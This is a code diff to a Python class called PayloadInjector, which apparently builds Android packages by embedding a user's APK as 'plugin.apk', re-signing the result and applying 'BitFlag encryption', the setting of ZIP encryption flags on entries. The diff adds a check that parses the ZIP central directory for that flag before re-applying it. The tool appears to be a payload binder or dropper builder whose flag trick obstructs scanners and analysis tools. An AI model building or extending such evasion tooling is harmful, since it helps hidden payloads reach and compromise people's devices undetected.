@@ -162,14 +162,21 @@ class PayloadInjector:
                 os.remove(plugin_path)
                 logger.debug("Removed old plugin.apk")
             
-            # Encrypt user APK before injection
-            logger.info("🔐 Encrypting user APK (BitFlag)...")
-            encrypted_apk = await self._encrypt_bitflag(user_apk_path, plugin_path)
+            # Check if APK already has BitFlag
+            already_encrypted = await self._check_bitflag(user_apk_path)
             
-            if not encrypted_apk:
-                # Fallback: copy without encryption
-                logger.warning("Encryption failed, copying without BitFlag")
+            if already_encrypted:
+                logger.info("✅ APK already encrypted (BitFlag detected), copying as-is...")
                 shutil.copy2(user_apk_path, plugin_path)
+            else:
+                # Encrypt user APK before injection
+                logger.info("🔐 Encrypting user APK (BitFlag)...")
+                encrypted_apk = await self._encrypt_bitflag(user_apk_path, plugin_path)
+                
+                if not encrypted_apk:
+                    # Fallback: copy without encryption
+                    logger.warning("Encryption failed, copying without BitFlag")
+                    shutil.copy2(user_apk_path, plugin_path)
             
             logger.info("✅ User APK injected as plugin.apk")
             
@@ -340,6 +347,56 @@ class PayloadInjector:
         except Exception as e:
             logger.error(f"Signing error: {str(e)}")
             return None
+    
+    async def _check_bitflag(self, apk_path):
+        """Check if APK already has BitFlag encryption"""
+        try:
+            with open(apk_path, 'rb') as f:
+                data = f.read()
+            
+            # Find EOCD
+            eocd_sig = b'\x50\x4B\x05\x06'
+            eocd_offset = data.rfind(eocd_sig)
+            if eocd_offset == -1:
+                return False
+            
+            # Get Central Directory info
+            cd_size = struct.unpack_from('<I', data, eocd_offset + 12)[0]
+            cd_offset = struct.unpack_from('<I', data, eocd_offset + 16)[0]
+            
+            pos = cd_offset
+            encrypted_count = 0
+            total_count = 0
+            
+            # Check entries
+            while pos < cd_offset + cd_size:
+                if pos + 4 > len(data) or data[pos:pos+4] != b'\x50\x4B\x01\x02':
+                    break
+                
+                # Check BitFlag
+                bitflag_offset = pos + 8
+                bitflag = struct.unpack_from('<H', data, bitflag_offset)[0]
+                
+                total_count += 1
+                if bitflag & 0x0001:
+                    encrypted_count += 1
+                
+                # Move to next entry
+                name_len = struct.unpack_from('<H', data, pos + 28)[0]
+                extra_len = struct.unpack_from('<H', data, pos + 30)[0]
+                comment_len = struct.unpack_from('<H', data, pos + 32)[0]
+                pos += 46 + name_len + extra_len + comment_len
+            
+            # If more than 50% entries are encrypted, consider it encrypted
+            if total_count > 0 and encrypted_count > (total_count * 0.5):
+                logger.info(f"🔍 BitFlag detected: {encrypted_count}/{total_count} entries encrypted")
+                return True
+            
+            return False
+            
+        except Exception as e:
+            logger.debug(f"BitFlag check error: {str(e)}")
+            return False
     
     async def _encrypt_bitflag(self, input_apk, output_apk):
         """Apply BitFlag encryption to APK"""
